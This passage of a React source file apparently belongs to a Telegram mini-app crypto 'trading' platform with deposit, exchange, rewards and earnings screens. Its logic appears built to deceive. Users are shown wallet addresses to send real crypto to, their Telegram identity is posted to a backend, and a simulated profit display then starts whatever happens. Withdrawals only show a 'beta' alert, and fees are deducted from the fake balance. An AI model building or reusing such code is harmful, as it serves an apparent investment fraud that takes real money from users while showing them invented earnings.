        showBetaAlert(copy.alerts.sendNeedVolume);
        return;
      }

      if (balance < 25) {
        showBetaAlert(copy.alerts.sendNeedBalance);
        return;
      }

      setDemoProfit((current) => Number((current - 25).toFixed(2)));
      pushActivity({
        type: "send",
        amount: "-$25.00",
        asset: currentAssetMeta.short,
        timestamp: Date.now()
      });
      showBetaAlert(copy.alerts.sendDone);
    }
  };

  const selectExchangeAsset = (nextAsset) => {
    const nextMeta = assetMeta[nextAsset];

    setExchangeOpen(false);

    if (!nextMeta) {
      return;
    }

    if (nextAsset === currentAsset) {
      showBetaAlert(copy.alerts.exchangeCurrent(currentAssetMeta.short));
      return;
    }

    const fee = totalDeposited > 0 && balance > 0 ? Math.max(0.1, Number((balance * EXCHANGE_FEE_RATE).toFixed(2))) : 0;

    setMarketData(null);
    setCurrentAsset(nextAsset);

    if (fee > 0) {
      setDemoProfit((current) => Number((current - fee).toFixed(2)));
      pushActivity({
        type: "exchange",
        amount: `-$${fee.toFixed(2)}`,
        asset: "FEE",
        from: currentAssetMeta.short,
        to: nextMeta.short,
        timestamp: Date.now()
      });
    } else {
      pushActivity({
        type: "mode",
        amount: "$0.00",
        asset: nextMeta.short,
        from: currentAssetMeta.short,
        to: nextMeta.short,
        timestamp: Date.now()
      });
    }

    showBetaAlert(copy.alerts.exchangeChanged(currentAssetMeta.short, nextMeta.short, fee));
  };

  const openSupport = (ticket = null) => {
    showBetaAlert(ticket ? copy.alerts.supportTicket(ticket) : copy.alerts.supportBeta);
  };

  const generateDepositRequest = () => {
    const amount = Number.parseFloat(depositInput);

    if (!Number.isFinite(amount) || amount <= 0) {
      showBetaAlert(copy.alerts.amountInvalid);
      return;
    }

    if (amount < MIN_DEPOSIT_AMOUNT) {
      showBetaAlert(copy.alerts.amountMinimum(MIN_DEPOSIT_AMOUNT));
      return;
    }

    const asset = depositAssetMeta[depositCurrency];
    const cryptoAmount = Number((amount / asset.usdPrice).toFixed(asset.decimals));

    setGeneratedDeposit({
      symbol: depositCurrency,
      name: asset.name,
      network: asset.network,
      amountUsd: amount,
      cryptoAmount,
      decimals: asset.decimals,
      wallet: asset.address,
      ticket: createReferenceNumber("PG")
    });
  };

  const handleDepositGenerate = () => {
    if (isDepositGenerating) {
      return;
    }

    setDepositGenerating(true);
    depositGenerationRef.current = window.setTimeout(() => {
      depositGenerationRef.current = null;
      setDepositGenerating(false);
      generateDepositRequest();
    }, DEPOSIT_GENERATION_DELAY_MS);
  };

  const handleDepositConfirm = async () => {
    if (!generatedDeposit || isDepositConfirming) {
      return;
    }

    setDepositConfirming(true);

    try {
      const response = await fetch("/api/deposits/confirm", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          userId: telegramUser?.id || null,
          notifyChatId: telegramUser?.id || null,
          user: telegramUser,
          deposit: generatedDeposit
        })
      });

      if (!response.ok) {
        const payload = await response.json().catch(() => ({}));
        throw new Error(payload.error || "Failed to notify Telegram");
      }
    } catch {
      showBetaAlert(copy.alerts.depositNotifyFailed);
    } finally {
      setDepositConfirming(false);
      startDemoSimulation(generatedDeposit.amountUsd, generatedDeposit.symbol);
    }
  };

  const getRewardProgress = (program) =>
    program.type === "deposit" ? Math.min(totalDeposited, program.target) : Math.min(totalTraded, program.target);

  const isRewardComplete = (program, progress) => progress >= program.target;

  const formatRewardProgress = (program, progress) => {
    const digits = program.type === "deposit" ? 0 : 1;
    return `$${progress.toFixed(digits)} / $${program.target}`;
  };

  const renderTabContent = (currentTab) => {
    if (currentTab === "home") {
      return (
        <section className="home-layout">
          {isHeroVisible && (
            <div className={isHeroClosing ? "hero-banner-shell closing" : "hero-banner-shell"}>
              <article className="panel hero-banner">
                <button className="hero-close" type="button" onClick={dismissHero} aria-label={copy.hero.closeLabel}>
                  x
                </button>
                <div className="hero-copy">
                  <p className="section-tag">{copy.hero.tag}</p>
                  <h2>{copy.hero.title}</h2>
                  <p>{copy.hero.description}</p>
                </div>
                <div className="hero-tags">
                  {copy.hero.tags.map((tag) => (
                    <span className="hero-tag" key={tag}>
                      {tag}
                    </span>
                  ))}
                </div>
              </article>
            </div>
          )}

          <section className="hero-panel">
            <div className="balance-panel panel">
              <p className="section-tag">{copy.home.capitalTag}</p>
              <div className="balance-value">$ {balance.toFixed(2)}</div>
              <p className="balance-note">
                {demoAmount > 0
                  ? isDemoRunning
                    ? copy.home.balanceRunningNote
                    : copy.home.balanceClosedNote
                  : copy.home.balanceIdleNote}
              </p>
              <div className="action-row">
                <button
                  className="primary-button shimmer-button button-loading"
                  type="button"
                  data-busy={pendingHomeAction === "home-deposit" ? "true" : undefined}
                  aria-busy={pendingHomeAction === "home-deposit"}
                  disabled={Boolean(pendingHomeAction)}
                  onClick={() => runHomeAction("home-deposit", () => setDepositOpen(true))}
                >
                  {copy.home.depositButton}
                </button>
                <button
                  className="secondary-button button-loading"
                  type="button"
                  data-busy={pendingHomeAction === "home-withdraw" ? "true" : undefined}
                  aria-busy={pendingHomeAction === "home-withdraw"}
                  disabled={Boolean(pendingHomeAction)}
                  onClick={() => runHomeAction("home-withdraw", showBetaWithdraw)}
                >
                  {copy.home.withdrawButton}
                </button>
              </div>
              <div className="market-row">
                <span>{copy.home.marketModeLabel}</span>
                <strong>{copy.home.marketModeValue}</strong>
              </div>
              <div className="market-row">
                <span>{copy.home.marketTrendLabel}</span>
                <strong className="positive">{copy.home.marketTrendValue}</strong>
              </div>
            </div>

            <article className="panel compact-panel market-overview">
              <div className="card-head">
                <div>
                  <p className="section-tag">{copy.home.marketCoreTag}</p>
                  <h3>{currentAssetMeta.pair}</h3>
                </div>
              </div>
              <div className="stat-grid market-overview-grid">
                <div className="stat-box">
                  <span>{copy.home.priceLabel}</span>
                  <strong>
                    {marketData?.market?.current_price != null
                      ? `$${formatMarketPrice(marketData.market.current_price)}`
                      : "--"}
                  </strong>
                </div>
                <div className="stat-box">
                  <span>{copy.home.totalTradedLabel}</span>
                  <strong>${totalTraded.toFixed(1)}</strong>
                </div>
                <div className="stat-box">
                  <span>{copy.home.swapFeeLabel}</span>
                  <strong>0.6%</strong>
                </div>
              </div>
            </article>
          </section>

          <section className="quick-actions-wrap panel compact-panel">
            <div className="quick-actions">
              {quickActions.map((item) => (
                <button
                  className="quick-action button-loading"
                  type="button"
                  key={item.key}
                  data-busy={pendingHomeAction === `quick-${item.key}` ? "true" : undefined}
                  aria-busy={pendingHomeAction === `quick-${item.key}`}
                  disabled={Boolean(pendingHomeAction)}
                  onClick={() => runHomeAction(`quick-${item.key}`, () => handleQuickAction(item.key))}
                >
                  <span className="quick-action-icon">{item.icon}</span>
                  <span className="quick-action-label">{copy.quickActions[item.key]}</span>
                </button>
              ))}
            </div>
          </section>

          <section className="single-column">
            <article className="panel compact-panel">
              <div className="card-head">
                <div>
                  <p className="section-tag">{copy.home.activityTag}</p>
                  <h3>{copy.home.activityTitle}</h3>
                </div>
                {hasMoreActivities && (
                  <button
                    className="ghost-link button-loading"
                    type="button"
                    data-busy={pendingHomeAction === "activity-open" ? "true" : undefined}
                    aria-busy={pendingHomeAction === "activity-open"}
                    disabled={Boolean(pendingHomeAction)}
                    onClick={() => runHomeAction("activity-open", () => handleTabChange("activity"))}
                  >
                    ↓
                  </button>
                )}
              </div>
              <div className="activity-list">
                {activityPreview.length > 0 ? (
                  renderActivityItems(activityPreview)
                ) : (
                  <div className="activity-empty">{copy.home.activityEmpty}</div>
                )}
              </div>
            </article>
          </section>

          <article className="chart-panel panel">
            <div className="chart-head">
              <div>
                <p className="section-tag">{`${currentAssetMeta.short} ${copy.home.marketFeedTag}`}</p>
                <h2>{currentAssetMeta.pair}</h2>
              </div>
              <div className="chart-meta">
                <div className="chart-badge">
                  {marketData?.market?.current_price != null
                    ? `$${formatMarketPrice(marketData.market.current_price)}`
                    : copy.home.syncBadge}
                </div>
                {demoAmount > 0 && (
                  <div className="profit-badge-mini">
                    <span>{copy.home.incomeMini}</span>
                    <strong className={demoProfit >= 0 ? "positive" : "negative"}>
                      {formatSignedMoney(demoProfit)}
                    </strong>
                  </div>
                )}
              </div>
            </div>

            <div
              className="candle-grid"
              style={{ gridTemplateColumns: `repeat(${Math.max(candleSeries.length, 24)}, minmax(0, 1fr))` }}
            >
              {candleSeries.length > 0 ? (
                candleSeries.map((candle, index) => {
                  const bullish = candle.close >= candle.open;
                  const bodyTop = Math.max(candle.open, candle.close);
                  const bodyBottom = Math.min(candle.open, candle.close);

                  return (
                    <div className="candle-col" key={index}>
                      <div
                        className="candle-wick"
                        style={{
                          top: `${100 - candleScale.normalize(candle.high)}%`,
                          bottom: `${candleScale.normalize(candle.low)}%`
                        }}
                      ></div>
                      <div
                        className={bullish ? "candle-body bullish" : "candle-body bearish"}
                        style={{
                          top: `${100 - candleScale.normalize(bodyTop)}%`,
                          height: `${Math.max(
                            candleScale.normalize(bodyTop) - candleScale.normalize(bodyBottom),
                            4
                          )}%`
                        }}
                      ></div>
                    </div>
                  );
                })
              ) : (
                <div className="candle-empty">LIVE FEED</div>
              )}
            </div>

            <div className="chart-footer">
              <span>
                {marketData?.market
                  ? `${copy.home.rangeLabel}: ${formatMarketPrice(marketData.market.low_24h)} - ${formatMarketPrice(
                      marketData.market.high_24h
                    )}`
                  : copy.home.connection}
              </span>
              <strong
                className={
                  (marketData?.market?.price_change_percentage_24h ?? 0) >= 0 ? "positive" : "negative"
                }
              >
                {marketData?.market?.price_change_percentage_24h != null
                  ? `${marketData.market.price_change_percentage_24h.toFixed(2)}%`
                  : "--"}
              </strong>
            </div>
          </article>

          <article className="panel compact-panel support-panel">
            <div className="card-head">
              <div>
                <p className="section-tag">{copy.home.supportTag}</p>
                <h3>{copy.home.supportTitle}</h3>
              </div>
            </div>
            <p className="support-copy">{copy.home.supportCopy}</p>
            <button
              className="ghost-link support-link button-loading"
              type="button"
              data-busy={pendingHomeAction === "support-open" ? "true" : undefined}
              aria-busy={pendingHomeAction === "support-open"}
              disabled={Boolean(pendingHomeAction)}
              onClick={() => runHomeAction("support-open", openSupport)}
            >
              {copy.home.supportLink}
            </button>
          </article>

          <section className="cards-row">
            <article className="panel compact-panel">
              <div className="card-head">
                <div>
                  <p className="section-tag">{copy.home.newsTag}</p>
                  <h3>{copy.home.newsTitle}</h3>
                </div>
                <button
                  className="ghost-link button-loading"
                  type="button"
                  data-busy={pendingHomeAction === "news-open" ? "true" : undefined}
                  aria-busy={pendingHomeAction === "news-open"}
                  disabled={Boolean(pendingHomeAction)}
                  onClick={() => runHomeAction("news-open", () => handleTabChange("news"))}
                >
                  {copy.home.newsAll}
                </button>
              </div>
              <div className="news-list">{renderNewsItems(featuredNews)}</div>
            </article>

            <article className="panel compact-panel">
              <div className="card-head">
                <div>
                  <p className="section-tag">{copy.home.whyTag}</p>
                  <h3>{copy.home.whyTitle}</h3>
                </div>
              </div>
              <div className="stat-grid">
                {copy.aiStatus.map((item) => (
                  <div className="stat-box" key={item.label}>
                    <span>{item.label}</span>
                    <strong>{item.value}</strong>
                  </div>
                ))}
              </div>
            </article>
          </section>

          <footer className="legal-footer">{copy.home.legal}</footer>
        </section>
      );
    }

    if (currentTab === "earnings") {
      return (
        <section className="single-column">
          <article className="panel compact-panel">
            <div className="card-head">
              <div>
                <p className="section-tag">{copy.earnings.tag}</p>
                <h3>{copy.earnings.title}</h3>
              </div>
              {demoAmount > 0 && <div className="chart-badge">live</div>}
            </div>
            <div className="stat-grid earnings-grid">
              <div className="stat-box">
                <span>{copy.home.incomeMini}</span>
                <strong className={demoProfit >= 0 ? "positive" : "negative"}>
                  {demoAmount > 0 ? formatSignedMoney(demoProfit) : "$0.00"}
                </strong>
              </div>
              <div className="stat-box">
                <span>%</span>
                <strong className={demoPercent >= 0 ? "positive" : "negative"}>
                  {demoAmount > 0 ? formatSignedPercent(demoPercent) : "0.00%"}
                </strong>
              </div>
              <div className="stat-box">
                <span>{copy.home.capitalTag}</span>
                <strong>$ {balance.toFixed(2)}</strong>
              </div>
            </div>
          </article>

          <article className="panel compact-panel">
            <div className="card-head">
              <div>
                <p className="section-tag">{copy.earnings.engineTag}</p>
                <h3>{copy.earnings.sourceTitle}</h3>
              </div>
            </div>
            <div className="news-list">
              {copy.earningsSources.map((source) => (
                <div className="news-item signal-item" key={source.name}>
                  <div>
                    <strong>{source.name}</strong>
                    <p>{source.note}</p>
                  </div>
                  <div className="signal-side">
                    <span>{copy.earnings.shareLabel}</span>
                    <strong>{source.share}</strong>
                  </div>
                </div>
              ))}
            </div>
          </article>
        </section>
      );
    }

    if (currentTab === "rewards") {
      return (
        <section className="single-column">
          <article className="panel compact-panel">
            <div className="card-head">
              <div>
                <p className="section-tag">{copy.rewards.tag}</p>
                <h3>{copy.rewards.title}</h3>
              </div>
            </div>
            <div className="reward-grid">
              {rewardPrograms.map((program) => (
                <article className="reward-card" key={program.title}>
                  {(() => {
                    const progress = getRewardProgress(program);
                    const completed = isRewardComplete(program, progress);

                    return (
                      <>
                        <div className="reward-head">
                          <strong>{program.title}</strong>
                          <span className="reward-pill">{program.reward}</span>
                        </div>
                        <div className="reward-progress">
                          <div className="reward-progress-head">
                            <span>{formatRewardProgress(program, progress)}</span>
                            <strong className={completed ? "positive" : ""}>
                              {completed ? copy.rewards.statusDone : copy.rewards.statusProgress}
                            </strong>
                          </div>
                          <div className="reward-progress-track">
                            <div
                              className="reward-progress-bar"
                              style={{
                                width: `${Math.min((progress / program.target) * 100, 100)}%`
                              }}
                            ></div>
                          </div>
                        </div>
                        <p>{program.note}</p>
                        <button className="ghost-link reward-link" type="button" onClick={() => setDepositOpen(true)}>
                          {copy.rewards.activate}
                        </button>
                      </>
                    );
                  })()}
                </article>
              ))}
            </div>
          </article>
        </section>
      );
    }

    if (currentTab === "activity") {
      return (
        <section className="single-column">
          <article className="panel compact-panel">
            <div className="card-head">
              <div>
                <p className="section-tag">{copy.activityPage.tag}</p>
                <h3>{copy.activityPage.title}</h3>
              </div>
              <button className="ghost-link" type="button" onClick={() => handleTabChange("home")}>
                {copy.activityPage.back}
              </button>
            </div>
            <div className="activity-list">
              {activityFeed.length > 0 ? (
                renderActivityItems(activityFeed)
              ) : (
                <div className="activity-empty">{copy.home.activityEmpty}</div>
              )}
            </div>
          </article>
        </section>
      );
    }

    return (
      <section className="single-column">
        <article className="panel compact-panel">
          <div className="card-head">
            <div>
              <p className="section-tag">{copy.newsPage.tag}</p>
              <h3>{copy.newsPage.title}</h3>
            </div>
          </div>
          <div className="news-list">{renderNewsItems(newsFeed)}</div>
        </article>
      </section>
    );
  };

  return (
    <div className="app-shell">
      <div className="grid-glow glow-left"></div>
      <div className="grid-glow glow-right"></div>

      <header className="topbar">
        <div className="brand-lockup">
          <span className="brand-glyph">
            <img className="brand-icon" src={pegasusMark} alt="" />
          </span>
          <div className="brand-text">
            <h1>
              <span className="brand-main">{copy.brand.main}</span>
              <span className="brand-sub">{copy.brand.sub}</span>
            </h1>
          </div>
        </div>
        <div className="language-switch" role="group" aria-label={copy.languageSwitchLabel}>
          <button
            className={language === "ru" ? "language-button active" : "language-button"}
            type="button"
            aria-pressed={language === "ru"}
            onClick={() => setLanguage("ru")}
          >
            RU
          </button>
          <button
            className={language === "en" ? "language-button active" : "language-button"}
            type="button"
            aria-pressed={language === "en"}
            onClick={() => setLanguage("en")}
          >
            EN
          </button>
        </div>
      </header>

      <main className="main-area">
        <div className={isTabAnimating ? "tab-stage animating" : "tab-stage"}>
          {outgoingTab && (
            <div
              className={
                tabDirection > 0 ? "tab-pane tab-pane-overlay tab-exit-left" : "tab-pane tab-pane-overlay tab-exit-right"
              }
            >
              {renderTabContent(outgoingTab)}
            </div>
          )}
          <div
            className={
              isTabAnimating ? (tabDirection > 0 ? "tab-pane tab-enter-right" : "tab-pane tab-enter-left") : "tab-pane tab-current"
            }
          >
            {renderTabContent(tab)}
          </div>
        </div>
      </main>

      <nav className="bottom-nav">
        <BottomNavButton label={copy.nav.home} active={tab === "home"} onClick={() => handleTabChange("home")} />
        <BottomNavButton
          label={copy.nav.earnings}
          active={tab === "earnings"}
          onClick={() => handleTabChange("earnings")}
        />
        <BottomNavButton
          label={copy.nav.rewards}
          active={tab === "rewards"}
          onClick={() => handleTabChange("rewards")}
        />
        <BottomNavButton label={copy.nav.news} active={tab === "news"} onClick={() => handleTabChange("news")} />
      </nav>

      {isDepositOpen && (
        <div className="modal-backdrop" onClick={closeDepositModal} role="presentation">
          <div className="deposit-modal panel" onClick={(event) => event.stopPropagation()} role="dialog">
            <p className="section-tag">{copy.modal.depositTitle}</p>
            <h3>{copy.modal.amountTitle}</h3>
            <div className="deposit-flow">
              <div className="field-stack">
                <label className="field-label" htmlFor="deposit-currency">
                  {copy.modal.currencyLabel}
                </label>
                <select
                  id="deposit-currency"
                  className="currency-select"
                  value={depositCurrency}
                  disabled={isDepositGenerating}
                  onChange={(event) => {
                    setDepositCurrency(event.target.value);
                    setGeneratedDeposit(null);
                  }}
                >
                  {Object.entries(depositAssetMeta).map(([symbol, asset]) => (
                    <option key={symbol} value={symbol}>
                      {asset.name} ({symbol})
                    </option>
                  ))}
                </select>
              </div>

              <div className="field-stack">
                <label className="field-label" htmlFor="deposit-amount">
                  {copy.modal.amountUsdLabel}
                </label>
                <div className="amount-wrap">
                  <span className="amount-prefix">$</span>
                  <input
                    id="deposit-amount"
                    className="amount-input"
                    type="number"
                    min={MIN_DEPOSIT_AMOUNT}
                    step="1"
                    disabled={isDepositGenerating}
                    value={depositInput}
                    onChange={(event) => {
                      setDepositInput(event.target.value);
                      setGeneratedDeposit(null);
                    }}
                  />
                </div>
              </div>

              {generatedDeposit && (
                <div className="deposit-details">
                  <p className="section-tag">{copy.modal.walletTitle}</p>
                  <div className="deposit-details-card">
                    <div className="detail-grid">
                      <div className="detail-row">
                        <span>{copy.modal.currencyLabel}</span>
                        <strong>{`${generatedDeposit.name} (${generatedDeposit.symbol})`}</strong>
                      </div>
                      <div className="detail-row">
                        <span>{copy.modal.networkLabel}</span>
                        <strong>{generatedDeposit.network}</strong>
                      </div>
                      <div className="detail-row">
                        <span>{copy.modal.amountCryptoLabel}</span>
                        <strong>{`${generatedDeposit.cryptoAmount.toFixed(generatedDeposit.decimals)} ${generatedDeposit.symbol}`}</strong>
                      </div>
                      <div className="detail-row">
                        <span>{copy.modal.amountUsdLabel}</span>
                        <strong>{formatMoney(generatedDeposit.amountUsd)}</strong>
                      </div>
                      <div className="detail-row">
                        <span>{copy.modal.ticketLabel}</span>
                        <strong>{generatedDeposit.ticket}</strong>
                      </div>
                    </div>
                    <div className="field-stack">
                      <span className="field-label">{copy.modal.walletLabel}</span>
                      <div className="hash-display">{generatedDeposit.wallet}</div>
                    </div>
                    <p className="modal-note deposit-warning">{copy.modal.notice}</p>
                    <div className="deposit-detail-actions">
                      <button
                        className="ghost-link support-link"
                        type="button"
                        disabled={isDepositConfirming}
                        onClick={() => openSupport(generatedDeposit.ticket)}
                      >
                        {copy.modal.support}
                      </button>
                    </div>
                  </div>
                </div>
              )}
            </div>
            <div className="action-row wallet-buttons">
              <button
                className="primary-button shimmer-button button-loading"
                type="button"
                data-busy={isDepositGenerating || isDepositConfirming ? "true" : undefined}
                aria-busy={isDepositGenerating || isDepositConfirming}
                disabled={isDepositGenerating || isDepositConfirming}
                onClick={
                  generatedDeposit
                    ? handleDepositConfirm
                    : handleDepositGenerate
                }
              >
                {generatedDeposit ? copy.modal.confirm : copy.modal.generate}
              </button>
              <button
                className="secondary-button"
                type="button"
                disabled={isDepositGenerating || isDepositConfirming}
                onClick={closeDepositModal}
              >
                {copy.modal.cancel}
              </button>
            </div>
          </div>
        </div>
      )}

      {isExchangeOpen && (
        <div className="modal-backdrop" onClick={() => setExchangeOpen(false)} role="presentation">
          <div className="deposit-modal panel" onClick={(event) => event.stopPropagation()} role="dialog">
            <p className="section-tag">{copy.exchange.tag}</p>
            <h3>{copy.exchange.title}</h3>
            <div className="exchange-grid">
              {Object.entries(assetMeta).map(([key, asset]) => (
                <button
                  className={key === currentAsset ? "exchange-option active" : "exchange-option"}
                  type="button"
                  key={key}
                  onClick={() => selectExchangeAsset(key)}
                >
                  <strong>{asset.short}</strong>
                  <span>{asset.pair}</span>
                </button>
              ))}
            </div>
            <div className="action-row wallet-buttons">
              <button className="secondary-button" type="button" onClick={() => setExchangeOpen(false)}>
                {copy.exchange.close}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

function BottomNavButton({ label, active, onClick }) {
  return (
    <button className={active ? "bottom-button active" : "bottom-button"} type="button" aria-pressed={active} onClick={onClick}>
      {label}
    </button>
  );
}

export default App;
